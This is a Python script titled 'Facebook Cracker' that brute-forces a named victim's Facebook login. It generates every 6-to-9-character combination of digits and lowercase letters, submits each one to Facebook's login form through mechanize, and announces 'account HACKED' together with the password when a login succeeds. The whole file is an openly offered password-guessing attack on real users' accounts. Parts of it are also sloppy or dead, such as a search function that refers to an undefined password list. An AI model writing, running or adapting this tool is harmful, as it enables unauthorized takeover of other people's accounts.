import sys

import random

import mechanize

import http.cookiejar

import itertools
import string
import time


#print list(itertools.combinations_with_replacement([1,2,3], 2))
#print list(string.printable)
from itertools import product
 
GHT = '''

        +=======================================+

        |..........Facebook Cracker v 4.........|

        +---------------------------------------+

        |#Author: Emara                     |

        |#Contact: fb.com |

        |#Date: 02/03/2017                     |

        +=======================================+

        |..........Facebook Cracker v 3.........|

        +---------------------------------------+

'''

print("Note: - This tool can crack facebook account even if you don't have the email of your victim")

print("# Hit CTRL+C to quit the program")

print("# Use www.graph.facebook.com for more infos about your victim ^_^")

 

 

email = str(input("# id of victime  : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

 

 

 

login = 'https://www.facebook.com/login.php?login_attempt=1'
loginpg='login.php'

global itr
itr=0
def attack(password):

  

  try:
     global itr
     itr +=1
     sys.stdout.write("\r[*] trying %s.. %s" % (password,itr))

     sys.stdout.flush()

     br.addheaders = [('User-agent', random.choice(useragents))]

     site = br.open(login)

     br.select_form(nr=0)

 

       

     ##Facebook

     br.form['email'] =email

     br.form['pass'] = password
     while True:
        if(br.submit()):                
          if site.code==200:
            break
          else:
            continue
     #br.submit()

     log = br.geturl()
     #print "\n [*] Password : %s\n" % site.code

     ##if log != login:
     if loginpg not in log:

        print("\n\n\n [*] account HACKED !!")

        print("\n [*] Password : %s\n" % (password))

        sys.exit(1)

  except KeyboardInterrupt:

        print("\n[*] Exiting program .. ")

        sys.exit(1)

 

def search():

    global password

    for password in passwords:

        attack(password.replace("\n",""))

 

 

def gen_pass():
# check permutations until we find the word 'crack'
 listchar=list(string.printable)
 for q in range(6, 10):
  #y=list(product(listchar[0:36], repeat=q)[885:len(list(product(listchar[0:36], repeat=q)))])
  for x in product(listchar[0:36], repeat=q):
                        w = ''.join(x)
                        #print w
                        #if w == 'xxx': break
                        attack(w)

def check():

 

    global br

    global passwords
    itr=0
    try:

       br = mechanize.Browser()

       cj = http.cookiejar.LWPCookieJar()

       br.set_handle_robots(False)

       br.set_handle_equiv(True)

       br.set_handle_referer(True)

       br.set_handle_redirect(True)

       br.set_cookiejar(cj)

       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1000000)

    except KeyboardInterrupt:

       print("\n[*] Exiting program ..\n")

       #sys.exit(1)

    


    try:

        print(GHT)

        print(" [*] Account to crack : %s" % (email))

        print(" [*] Cracking, please wait ...")

    except KeyboardInterrupt:

        print("\n [*] Exiting program ..\n")

        #sys.exit(1)

    try:

        gen_pass()

        #attack(password)

    except KeyboardInterrupt:

        print("\n [*] Exiting program ..\n")

        #sys.exit(1)

 

if __name__ == '__main__':
 start_time = time.time()
 check()
 elapsed_time = time.time() - start_time
 print(elapsed_time)


                
        

